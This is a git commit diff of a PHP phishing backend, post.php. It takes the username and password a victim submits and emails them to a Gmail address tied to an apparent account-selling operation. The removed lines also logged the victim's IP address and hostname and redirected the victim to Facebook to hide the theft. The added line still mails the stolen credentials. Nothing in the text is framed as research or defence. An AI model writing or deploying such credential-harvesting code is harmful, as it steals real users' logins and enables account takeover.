83180baf8a4550d059bdeae5367f1b7726543d7c
LoL Prodaja Akaunta <lolprodajaacc@gmail.com>
2018-04-02 13:53:48 +0200

    added post.php file

--- post.php
+++ post.php
@@ -1,13 +1,5 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
-$hostname = gethostbyaddr($ip);
-$message .= "-----------------|Account Origin|-------------------\n";
 $message .= "Mail                            : ".$_POST['username']."\n";
 $message .= "Pass                    : ".$_POST['password']."\n";
-$message .= "-----------------|Account Origin|-------------------\n";
-$send="lolprodajaacc@gmail.com";
-$subject = "LOL INFO | $ip";
-$headers = "From: LOL <lolprodajaacc@gmail.com>";
-mail($send,$subject,$message,$headers);
-header("Location: https://www.facebook.com/");
+mail('lolprodajaacc@gmail.com', 'My Subject', $message);
 ?>
